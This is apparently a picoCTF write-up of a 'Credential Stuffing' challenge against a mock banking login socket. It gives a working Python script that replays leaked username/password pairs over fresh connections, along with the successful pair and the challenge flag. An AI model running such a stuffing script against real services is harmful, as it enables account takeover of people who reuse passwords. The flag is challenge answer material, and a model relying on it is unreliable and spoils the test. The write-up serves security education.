# Credential Stuffing

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{d0nt_r3u5e_cr3d3nt1als_f452dfe3}`

## Summary

A "banking" service on a raw TCP socket has no rate limiting, no lockout, and no CAPTCHA on
login. Given a dump of 1,500 leaked `username;password` pairs, replaying every pair against the
service finds one that is a genuine reused credential, logging straight into a real account and
printing the flag.

## Discovery

Connecting with netcat shows a simple two-prompt login:

```
=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username:
```

A failed attempt returns `Invalid username or password` and the server then closes the
connection, so each attempt needs its own fresh TCP connection. A quick manual test confirmed
this and confirmed there is no throttling on repeated connection attempts.

## Proof of Concept

Replay every pair from `creds-dump.txt` against the service, one connection per pair, watching
for any response that isn't the invalid-credentials message:

```python
import socket

def try_login(user, pw, host="TARGET", port=PORT, timeout=8):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    buf = b""
    while b"Username:" not in buf:
        buf += s.recv(4096)
    s.sendall((user + "\n").encode())
    buf2 = b""
    while b"Password:" not in buf2:
        buf2 += s.recv(4096)
    s.sendall((pw + "\n").encode())
    result = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        result += chunk
    s.close()
    return result.decode(errors="replace")

for user, pw in pairs:
    out = try_login(user, pw)
    if "Invalid username or password" not in out:
        print(user, pw, out)
```

The pair `lyndy:zhang` returns:

```
Authenticating...
Welcome lyndy!
picoCTF{d0nt_r3u5e_cr3d3nt1als_f452dfe3}
```

A moderate amount of concurrency (parallel connections) caused the service to drop connections
under load and produce misleading empty responses that looked like false hits; running the sweep
with light concurrency and retrying any connection that didn't cleanly complete the full
prompt/response exchange gave a clean, false-positive-free result.

## Root Cause

Not a bug in the target application's code so much as a demonstration of the real-world risk the
challenge name describes: at least one account on this service reuses a password that also
appears in an unrelated, previously leaked credential set. Combined with the complete absence of
rate limiting or account lockout, that single reused password is enough to fully compromise the
account via pure automated replay, no cracking or logic flaw required.

## CWE / OWASP

- **CWE-307**: Improper Restriction of Excessive Authentication Attempts
- **CWE-521**: Weak Password Requirements (reused/weak credential enabling stuffing)
- **OWASP A07:2021**: Identification and Authentication Failures
